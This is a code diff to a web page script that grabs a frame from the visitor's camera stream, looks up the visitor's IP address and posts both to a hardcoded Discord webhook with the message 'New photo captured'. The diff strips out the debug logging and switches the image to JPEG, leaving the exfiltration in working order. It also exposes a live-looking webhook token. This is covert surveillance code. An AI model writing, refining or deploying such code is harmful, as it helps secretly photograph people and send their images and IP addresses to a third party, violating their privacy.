@@ -36,20 +36,13 @@
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.addEventListener('loadedmetadata', function() {
-                        console.log('Video dimensions:', video.videoWidth, video.videoHeight);
-
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        console.log('Canvas dimensions:', canvas.width, canvas.height);
-
                         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        const imgData = canvas.toDataURL('image/png');
-                        console.log('Captured image data:', imgData);
-
+                        const imgData = canvas.toDataURL('image/jpeg'); // Change image format to JPEG
                         getUserIP(function(ip) {
-                            console.log('User IP:', ip);
                             sendToDiscordWebhook(imgData, ip);
                         });
 
@@ -71,13 +64,13 @@
         }
 
         function sendToDiscordWebhook(imageData, userIP) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1218167346682663103/K1szw4If2QzyENmwLF6diJrmS6jVITzmJTcInoRs3aewfsOTJJNMWNRIWG-x3Pp0QVvT';
+            const webhookUrl = 'https://discord.com/api/webhooks/1218167346682663103/K1szw4If2QzyENmwLF6diJrmS6jVITzmJTcInoRs3aewfsOTJJNMWNRIWG-x3Pp0QVvT'; // Replace 'Your Discord Webhook URL' with your actual webhook URL
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ content: 'New photo captured', embeds: [{ description: `User IP: ${userIP}`, image: { url: imageData }, color: "000000" }] })
+                body: JSON.stringify({ content: 'New photo captured', embeds: [{ description: `User IP: ${userIP}`, image: { url: imageData } }] })
             });
         }
 
